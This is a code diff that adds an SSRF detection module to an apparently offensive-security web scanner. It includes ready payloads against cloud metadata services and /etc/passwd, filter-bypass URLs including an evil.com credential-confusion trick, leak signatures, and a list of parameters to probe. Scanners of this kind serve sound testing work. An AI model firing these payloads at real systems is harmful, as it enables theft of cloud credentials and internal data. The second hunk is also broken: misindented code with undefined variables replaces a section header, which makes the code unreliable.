@@ -15,6 +15,37 @@ except ImportError:
 from modules import BaseModule
 
 
+# Signatures that strongly indicate the server fetched an internal/metadata URL.
+METADATA_SIGNATURES = [
+    "ami-id", "instance-id", "iam/security-credentials", "accountid",
+    "computeMetadata", "kube-env", "root:x:0:", "oauth2/token",
+    "access_token", "ssh-rsa", "metadata.google", "securityCredentials",
+]
+
+# Core SSRF targets plus common filter-bypass variants.
+SSRF_PAYLOADS = [
+    # AWS / GCP / Azure metadata
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    # Localhost variants / internal
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://[::1]/",
+    "file:///etc/passwd",
+    # Bypass variants
+    "http://2130706433/",                 # decimal IP for 127.0.0.1
+    "http://0x7f000001/",                 # hex IP
+    "http://127.0.0.1.nip.io/",           # DNS that resolves to localhost
+    "http://169.254.169.254\\@evil.com/",  # credential confusion
+]
+
+SSRF_PARAMS = ["url", "redirect", "next", "return", "callback", "fetch",
+               "load", "link", "src", "uri", "path", "target", "dest",
+               "destination", "image", "img", "proxy", "feed", "host", "site"]
+
+
 class SSRFModule(BaseModule):
     NAME = "SSRF"
 
@@ -122,4 +153,69 @@ class SSRFModule(BaseModule):
             self.ui.info("No SSRF vulnerabilities detected.")
 
 
-# ─── Secrets Module ────────────────────────────────────────────────────────────
+                # AI second opinion (optional) when no clear signature matched.
+                ai_reason = None
+                if not hit and self.ai and self.ai.enabled:
+                    try:
+                        verdict = self.ai.analyze_ssrf_response(url, payload, resp.text)
+                        if verdict and verdict.get("is_ssrf") and \
+                                verdict.get("confidence") in ("high", "medium"):
+                            hit = True
+                            ai_reason = verdict.get("reason")
+                    except Exception:
+                        pass
+
+                if hit:
+                    desc = (
+                        f"The '{param}' parameter makes the server fetch arbitrary URLs. "
+                        f"Payload {payload} returned data matching an internal/metadata "
+                        "signature. An attacker can reach internal services and, on cloud "
+                        "hosts, steal IAM credentials to take over the account."
+                    )
+                    if ai_reason:
+                        desc += f"\n\nAI assessment: {ai_reason}"
+                    self.db.add(
+                        title=f"SSRF via '{param}' Parameter",
+                        severity="critical", url=base, module=self.NAME,
+                        description=desc,
+                        remediation=(
+                            "Whitelist allowed URL schemes and destinations. Block access to "
+                            "RFC1918 and cloud metadata IP ranges at the network level. "
+                            "Disable URL fetch functionality if not needed."
+                        ),
+                        cvss="9.1", confidence="high",
+                        evidence=[f"Payload: {payload}", f"PoC: {url}"],
+                    )
+                    self.ui.find("critical", f"SSRF via '{param}'", base)
+                    break  # one confirmed payload per param is enough
+                time.sleep(self.delay)
+
+    def _collect_targets(self):
+        targets = []
+        seen = set()
+
+        # Base URL probed against every candidate param.
+        for param in SSRF_PARAMS:
+            key = (self.base_url, param)
+            if key not in seen:
+                seen.add(key)
+                targets.append(key)
+
+        # Discovered endpoints that already use an SSRF-prone param.
+        for ep in self.ctx.get("endpoints", []):
+            try:
+                parsed = urllib.parse.urlparse(ep)
+                base = parsed.scheme + "://" + parsed.netloc + parsed.path
+                for param in urllib.parse.parse_qs(parsed.query):
+                    if param.lower() in SSRF_PARAMS:
+                        key = (base, param)
+                        if key not in seen:
+                            seen.add(key)
+                            targets.append(key)
+            except Exception:
+                continue
+
+        return targets
+
+
+# --- Secrets Module ---------------------------------------------------------
